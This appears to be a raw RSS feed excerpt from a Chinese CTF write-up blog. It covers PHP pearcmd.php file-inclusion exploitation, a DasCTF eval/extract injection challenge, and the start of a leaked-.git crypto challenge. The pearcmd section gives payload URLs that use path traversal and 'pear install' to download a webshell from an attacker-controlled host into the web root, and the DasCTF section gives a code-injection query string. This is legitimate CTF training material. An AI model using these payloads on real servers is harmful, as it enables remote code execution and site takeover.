&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">test&lt;/span> &lt;span style="color:#d88200">&amp;#34;/usr/local/lib/php&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;@&amp;#39;&lt;/span>php_dir&lt;span style="color:#d88200">&amp;#39;@&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#00a8c8">then&lt;/span>
&lt;span style="color:#111">INCDIR&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">`&lt;/span>dirname &lt;span style="color:#111">$0&lt;/span>&lt;span style="color:#d88200">`&lt;/span>
&lt;span style="color:#111">INCARG&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>
&lt;span style="color:#111">INCDIR&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;/usr/local/lib/php&amp;#34;&lt;/span>
&lt;span style="color:#111">INCARG&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;-d include_path=/usr/local/lib/php&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">fi&lt;/span>
&lt;span style="color:#00a8c8">fi&lt;/span>
&lt;span style="color:#111">exec&lt;/span> &lt;span style="color:#111">$PHP&lt;/span> -C -q &lt;span style="color:#111">$INCARG&lt;/span> -d data.timezone&lt;span style="color:#f92672">=&lt;/span>UTC -d &lt;span style="color:#111">output_buffering&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> -d &lt;span style="color:#111">variables_order&lt;/span>&lt;span style="color:#f92672">=&lt;/span>EGPCS -d &lt;span style="color:#111">open_basedir&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> -d &lt;span style="color:#111">safe_mode&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span> -d &lt;span style="color:#111">register_argc_argv&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;On&amp;#34;&lt;/span> -d &lt;span style="color:#111">auto_prepend_file&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> -d &lt;span style="color:#111">auto_append_file&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#111">$INCDIR&lt;/span>/pearcmd.php &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">$@&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>‰ªéÊúÄÂêé‰∏ÄË°åÂèØ‰ª•ÁúãÂà∞Ë∞ÉÁî®‰∫Ü/pearcmd.phpÔºåËÄåËøô‰∏™pearcmd.phpÁöÑÂèÇÊï∞$argvÂ∞±Êù•Ê∫ê‰∫é$_SERVER[&amp;lsquo;argv&amp;rsquo;]ÔºåËøô‰∏™ÊòØÊàë‰ª¨ÂèØÊéßÁöÑ‰º†ÂÖ•ÂèÇÊï∞&lt;/p>
&lt;h3 id="Âà©Áî®pearÂëΩ‰ª§ÊâßË°å‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩ">Âà©Áî®&lt;code>pear&lt;/code>ÂëΩ‰ª§ÊâßË°å‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩ&lt;/h3>
&lt;p>Â¶ÇÂõæÔºåÁõ¥Êé•‰∏ãËΩΩÂºÄÂêØ‰∫ÜhttpÊúçÂä°Âô®ÁöÑÁõÆÂΩï‰∏ãÁöÑÊåáÂÆöÊñá‰ª∂Âà∞ÂΩìÂâçÊâÄÂú®ÁõÆÂΩï&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024020030648.png" alt="image-20211024020030648">&lt;/p>
&lt;p>‰ΩøÁî®&lt;code>install -R&lt;/code>ËÄåÈùû&lt;code>download&lt;/code>ÂèØ‰ª•ÊéßÂà∂‰∏ãËΩΩÂà∞‰ªªÊÑèÁõÆÂΩïÔºåÊØîÂ¶ÇÁõ¥Êé•‰∏ãËΩΩÂà∞webÊúçÂä°ÁöÑÁõÆÂΩï&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024020411477.png" alt="image-20211024020411477">&lt;/p>
&lt;h3 id="ÊâÄ‰ª•ÊÄª‰ΩìÊÄùË∑Øpayload">ÊâÄ‰ª•ÊÄª‰ΩìÊÄùË∑Ø+payload&lt;/h3>
&lt;p>Â¶ÇÊûúÂ≠òÂú®ËøôÊ†∑ÁöÑÁéØÂ¢É&lt;/p>
&lt;ul>
&lt;li>ÂÆâË£Öpear&lt;/li>
&lt;li>ÂºÄÂêØregister_argc_argv&lt;/li>
&lt;li>Â≠òÂú®ÂèØÊéßÁöÑ‰º†ÂÖ•ÂèÇÊï∞Êù•ÂÅöÂà∞Êñá‰ª∂ÂåÖÂê´ÔºàÊØîÂ¶Ç&lt;code>include $_GET['f'].php&lt;/code>Ôºâ&lt;/li>
&lt;li>ÂèØ‰ª•Âá∫ÁΩë&lt;/li>
&lt;/ul>
&lt;p>Êàë‰ª¨Â∞±ÂèØ‰ª•ÂÅöÂà∞‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩ‰ªéËÄågetshellÔºõÂâçÈù¢‰πüÊèêÂà∞register_argc_argvÁªßÁª≠PHP_IN_PREDIRÔºåÊàë‰ª¨ÂèØ‰ª•Áïô‰∏Ä‰∏™.user.iniÁöÑÂêéÈó®Êù•ËÆæÁΩÆregister_argc_agrv‰∏∫On&lt;/p>
&lt;p>&lt;strong>payload&lt;/strong>Â∞±ÊòØËøôÊ†∑‰∫Ü&lt;/p>
&lt;pre tabindex="0">&lt;code>// Â≠òÂú® include $_GET['f'].php
// webÁõÆÂΩïÂèØÂÜô
- http://ip:port/include.php?f=/../../../../../../../../../../usr/local/lib/php/pearcmd&amp;amp;+install+-R+/var/www/html+http://ip:port/evil.php
- http://ip:port/tmp/pear/download/evil.php
// tmpÁõÆÂΩïÂèØÂÜô
- http://ip:port/include.php?f=/../../../../../../../../../../usr/local/lib/php/pearcmd&amp;amp;+install+-R+/tmp+http://ip:port/evil.php
- http://ip:port/include.php?f=/tmp/pear/download/evil
&lt;/code>&lt;/pre>&lt;p>È¶ñÂÖàË¶ÅÂåÖÂê´‰∏Ä‰∏™Ê≠£Á°Æ‰ΩçÁΩÆÁöÑpearcmd.phpÔºàÈÄöÂ∏∏Âú®/usr/local/lib/php/pearcmd.phpÔºâÔºåÊé•ÁùÄÂåÖÂê´&amp;amp;+download+http://your_vps/eval.phpÔºàÊàñËÄÖÂ¶ÇÊûúÂâçÈù¢Áõ¥Êé•ÊòØ/pearcmd.phpÁöÑËØùÂ∞±ÂèØ‰ª•Áõ¥Êé•ÁªôÂèÇÊï∞‰∫Ü/pearcmd.php+download+http://your_vps/eval.phpÔºâÊù•Ë£ÖüêéÔºàÊ≥®ÊÑèË∑ØÂæÑÊòØÂê¶Ê≠£Á°ÆÔºâÔºå‰πãÂêéÂÜçÂåÖÂê´Êàë‰ª¨ÁöÑüêéÂç≥ÂèØ&lt;/p>
&lt;h3 id="ÂÖ∂ÂÆÉÁöÑ‰æãÈ¢ò">ÂÖ∂ÂÆÉÁöÑ‰æãÈ¢ò&lt;/h3>
&lt;p>&lt;a href="https://web.archive.org/web/20201022203937/https://khack40.info/camp-ctf-2015-trolol-web-write-up/">[CampCTF 2015] Trolol&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.lemonprefect.cn/zh-tw/posts/9b2fbf24#MeowWorld">[Â∑ÖÂ≥∞ÊûÅÂÆ¢ 2020] MeowWord&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://blog.rois.io/2021/rctf-2021-official-writeup-2/">[RCTF 2021] VerySafe&lt;/a>&lt;/p>
&lt;hr>
&lt;p>ËøòÊòØÂÅöÁöÑÈ¢ò‰∏çÂ§üÂ§öÔºåÂ∑≤ÊúâÁöÑÁü•ËØÜ‰πüÂ∫îÁî®ÁöÑ‰∏çÂ§üÁÜüÁªÉÔºåÂÆûÂú®ÊòØÂ§™Â§™Â§™Â§™Â§™Ëèú‰∫ÜÔºåÂæóÂ•ΩÂ•ΩÂ≠¶Ôºå‰∏çËÉΩÂ§©Â§©ÂàíÊ∞¥Êë∏È±º&lt;/p></description></item><item><title>DasCTF1021 Wp</title><link>https://amiaaaz.github.io/2021/10/24/dasctf1021-wp/</link><pubDate>Sun, 24 Oct 2021 16:47:40 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/24/dasctf1021-wp/</guid><description>&lt;h2 id="webËø∑Ë∑ØÁöÑÈ≠îÊ≥ïÂ∞ëÂ•≥">Web/Ëø∑Ë∑ØÁöÑÈ≠îÊ≥ïÂ∞ëÂ•≥&lt;/h2>
&lt;blockquote>
&lt;p>È≠îÊ≥ïÂ∞ëÂ•≥Ëø∑Â§±Âú®‰∫Ü‰ª£Á†ÅÁ©∫Èó¥ ËØ∑ÂØªÊâæÂ•πÁé∞Âú®Âú®Âì™&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index.php&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">extract&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">error_reporting&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">String2Array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#00a8c8">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\$&lt;/span>&lt;span style="color:#d88200">array = &lt;/span>&lt;span style="color:#d88200">$data&lt;/span>&lt;span style="color:#d88200">;&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$array&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">is_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$attrid&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">is_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$attrvalue&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$attrstr&lt;/span> &lt;span style="color:#f92672">.=&lt;/span> &lt;span style="color:#d88200">&amp;#39;array(&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$attrids&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">count&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$attrid&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">$attrids&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$attrstr&lt;/span> &lt;span style="color:#f92672">.=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">intval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$attrid&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">])&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#34;=&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$attrvalue&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">$attrids&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$attrstr&lt;/span> &lt;span style="color:#f92672">.=&lt;/span> &lt;span style="color:#d88200">&amp;#39;,&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$attrstr&lt;/span> &lt;span style="color:#f92672">.=&lt;/span> &lt;span style="color:#d88200">&amp;#39;);&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">String2Array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$attrstr&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>/?attrid[]=&amp;amp;attrvalue[]=&amp;quot;);phpinfo();//
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024120107148.png" alt="image-20211024120107148">&lt;/p>
&lt;p>ÂèÇËÄÉÔºö&lt;a href="https://blog.csdn.net/zz_Caleb/article/details/88671071">CG-CTF ÂèòÈáèË¶ÜÁõñ(PHP extractÂáΩÊï∞Âà©Áî®)&lt;/a> | &lt;a href="https://lddp.github.io/2018/11/28/CTF-PHP%E9%BB%91%E9%AD%94%E6%B3%95/">CTF-PHPÈªëÈ≠îÊ≥ï&lt;/a>&lt;/p>
&lt;h2 id="miscwelcome-dasctfxjlenu">Misc/WELCOME DASCTFxJlenu&lt;/h2>
&lt;blockquote>
&lt;p>Ê¨¢ËøéÊù•Âà∞È≠îÊ≥ïÁöÑ‰∏ñÁïåÔºàÁ≠æÂà∞Ôºâ&lt;/p>
&lt;/blockquote>
&lt;p>ÂèØÊòØÊúâÂá†Â±ÇÂåÖÊµÜÁöÑÂéüÈ¢ò‰∫ÜÂ±û‰∫éÊòØÔºå‰πãÂâçÁªùÂØπÂÅöËøá‰∏ÄÊ¨°&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024105141498.png" alt="image-20211024105141498">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024105144295.png" alt="image-20211024105144295">&lt;/p></description></item><item><title>DigitalOverdoseCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/10/22/digitaloverdosectf2021-wp/</link><pubDate>Fri, 22 Oct 2021 11:54:15 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/22/digitaloverdosectf2021-wp/</guid><description>&lt;h2 id="webgit-commit--m-whatever">Web/git commit -m &amp;ldquo;whatever&amp;rdquo;&lt;/h2>
&lt;blockquote>
&lt;p>Visit the website&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211009120536593.png" alt="image-20211009120536593">&lt;/p>
&lt;p>emmmm ËÅîÁ≥ªËøô‰∏™È¢òÁõÆ ËÆøÈóÆ‰∏Ä‰∏ã.gitÁúãÁúãÊúâÊ≤°ÊúâÂ§á‰ªΩÊñá‰ª∂Ê≥ÑÈú≤&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211019214445911.png" alt="image-20211019214445911">&lt;/p>
&lt;p>Áî®GitHacker‰∏ãËΩΩÊ≥ÑÈú≤ÁöÑgitÊñá‰ª∂ÔºåÊúâ‰∏Ä‰∏™index.php&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#d88200">/**
&lt;/span>&lt;span style="color:#d88200"> * Simple sodium crypto class for PHP &amp;gt;= 7.2
&lt;/span>&lt;span style="color:#d88200"> * @author MRK
&lt;/span>&lt;span style="color:#d88200"> */&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">crypto&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">/**
&lt;/span>&lt;span style="color:#d88200"> *
&lt;/span>&lt;span style="color:#d88200"> * @return type
&lt;/span>&lt;span style="color:#d88200"> */&lt;/span>
&lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">create_encryption_key&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sodium_crypto_secretbox_keygen&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#d88200">/**
&lt;/span>&lt;span style="color:#d88200"> * Encrypt a message
&lt;/span>&lt;span style="color:#d88200"> *
&lt;/span>&lt;span style="color:#d88200"> * @param string $message - message to encrypt
&lt;/span>&lt;span style="color:#d88200"> * @param string $key - encryption key created using create_encryption_key()
&lt;/span>&lt;span style="color:#d88200"> * @return string
&lt;/span>&lt;span style="color:#d88200"> */&lt;/span>
&lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$message&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$key_decoded&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">base64_decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$nonce&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">random_bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#75af00">SODIUM_CRYPTO_SECRETBOX_NONCEBYTES&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$cipher&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">$nonce&lt;/span> &lt;span style="color:#f92672">.&lt;/span>
&lt;span style="color:#75af00">sodium_crypto_secretbox&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">$message&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$nonce&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$key_decoded&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">sodium_memzero&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$message&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">sodium_memzero&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key_decoded&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$cipher&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#d88200">/**
&lt;/span>&lt;span style="color:#d88200"> * Decrypt a message
&lt;/span>&lt;span style="color:#d88200"> * @param string $encrypted - message encrypted with safeEncrypt()
&lt;/span>&lt;span style="color:#d88200"> * @param string $key - key used for encryption
&lt;/span>&lt;span style="color:#d88200"> * @return string
&lt;/span>&lt;span style="color:#d88200"> */&lt;/span>
&lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">decrypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$encrypted&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$decoded&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">base64_decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$encrypted&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$key_decoded&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">base64_decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$decoded&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Decryption error : the encoding failed&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">mb_strlen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$decoded&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;8bit&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">SODIUM_CRYPTO_SECRETBOX_NONCEBYTES&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">SODIUM_CRYPTO_SECRETBOX_MACBYTES&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Decryption error : the message was truncated&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$nonce&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mb_substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$decoded&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">SODIUM_CRYPTO_SECRETBOX_NONCEBYTES&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;8bit&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$ciphertext&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mb_substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$decoded&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">SODIUM_CRYPTO_SECRETBOX_NONCEBYTES&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;8bit&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$plain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">sodium_crypto_secretbox_open&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">$ciphertext&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$nonce&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$key_decoded&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$plain&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Decryption error : the message was tampered with in transit&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">sodium_memzero&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ciphertext&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">sodium_memzero&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key_decoded&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$plain&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$privatekey&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;mRHpcEckKATdwDC/CwpRinDTiAYrn9lzWpTo277omKs=&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;../flag.txt&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$enc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">crypto&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$flag&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$privatekey&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$enc&lt;/span>&lt;span style="color:#111">;&lt;/span>
